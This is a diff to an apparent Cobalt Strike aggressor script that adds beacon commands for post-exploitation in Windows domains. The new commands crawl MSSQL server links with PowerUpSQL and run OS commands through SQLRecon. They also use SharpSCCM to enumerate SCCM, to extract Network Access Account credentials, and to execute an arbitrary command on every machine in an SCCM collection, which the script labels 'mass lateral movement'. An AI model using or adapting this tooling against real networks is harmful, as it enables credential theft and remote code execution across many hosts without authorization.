@@ -18,6 +18,7 @@ $SHARPGPOABUSE_PATH = getFileProper("C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bi
 $POWERUP_PATH       = getFileProper("C:\\Tools\\PowerSploit\\Privesc","PowerUp.ps1");
 $POWERUPSQL_PATH    = getFileProper("C:\\Tools\\PowerUpSQL","PowerUpSQL.ps1");
 $SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bin\\Release","SQLRecon.exe");
+$SHARPSCCM_PATH     = getFileProper("C:\\Tools\\SharpSCCM\\bin\\Release","SharpSCCM.exe");
 
 #TEST FUNCTION
 command beacons {
@@ -891,7 +892,7 @@ sub mssql_irunoscmd_cb1 {
     blog($1, $2);
     $args = $4;
     $command = $5;
-    $cb1_args = $args . " /m:ixpcmd /c:" . $command;
+    $cb1_args = $args . " /m:ixpcmd /c:\"" . $command . "\"";
 
     bexecute_assembly($1, $SQLRECON_PATH, $cb1_args, $null, lambda({ mssql_irunoscmd_cb2 ($1, $2, $3, $args); }));
 }
@@ -949,3 +950,85 @@ Usage:\n"
     . "mssql_irunoscmd [instance] [impersonating account] [module]\n"
     . "mssql_irunoscmd [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
 );
+
+## LINK ABUSE METHODS
+alias mssql_checklinks {
+    $size       = size(@_);
+    $instance   = $2;
+    $args       = join(" ", sublist(@_, 2, $size));
+    $command    = "Get-SQLServerLinkCrawl -Instance \"" . $instance . "\" " . $args;
+
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "mssql_checklinks",
+    "Use PowerUpSQL to run query to check for links",
+    "Usage:\n"
+    . "mssql_checklinks [instance] (PowerUpSQL Additional Args)\n"
+);
+
+#SCCM ENUMRATION AND ATTACKS
+##Enumeration
+sub sccm_getinfo_cb {
+    blog($1, $2);
+}
+alias sccm_getinfo{
+    $size = size(@_);
+    if ($size != 2) {
+        berror($1, "Invalid Parameters.");
+        return;
+    } else {
+        $args = "get site-info -d " . $2 . " --no-banner";
+        bexecute_assembly($1, $SHARPSCCM_PATH, $args, $null, &sccm_getinfo_cb);
+        bexecute_assembly($1, $SHARPSCCM_PATH, "get collections --no-banner", $null, &sccm_getinfo_cb);
+    }
+}
+beacon_command_register(
+    "sccm_getinfo",
+    "sccm_getinfo",
+    "Use SharpSCCM to get SCCM site info\n\n"
+    . "Usage:\n"
+    . "sccm_getinfo [domain]"
+)
+
+##Get Network Access Account Creds
+alias sccm_getnaacreds {
+    if(-isadmin $1){
+        $args = "local naa -m wmi --no-banner";
+        bexecute_assembly($1, $SHARPSCCM_PATH, $args);
+    }
+    else
+    {
+        berror($1, "Must be run as an admin user!");
+        return;
+    }
+}
+beacon_command_register(
+    "sccm_getnaacreds",
+    "Get SCCM NAA Creds",
+    "Get SCCM NAA Creds using SharpSCCM\n"
+    . "Requirements:\n"
+    . "  Administrator Access\n"
+    . "  Not use SMB Beacon"
+)
+
+## MASS LATERAL MOVEMENT!
+alias sccm_massLateralMovement {
+    $size    = size(@_);
+    $beacon  = $1;
+    $colname = $2;
+    $command = join(" ", sublist(@_, 2, $size));
+
+    $args = "exec"
+    . " -n " . $colname
+    . " -p \"" . $command . "\""
+    . " -s --no-banner";
+
+    bexecute_assembly($beacon, $SHARPSCCM_PATH, $args);
+}
+beacon_command_register(
+    "sccm_massLateralMovement",
+    "Specify command to run against all machines in a collection",
+    "Specify command to run against all machines in a collection\n\n"
+    ."Usages: sccm_massLateralMovement [CollectionName] [Command]"
+)
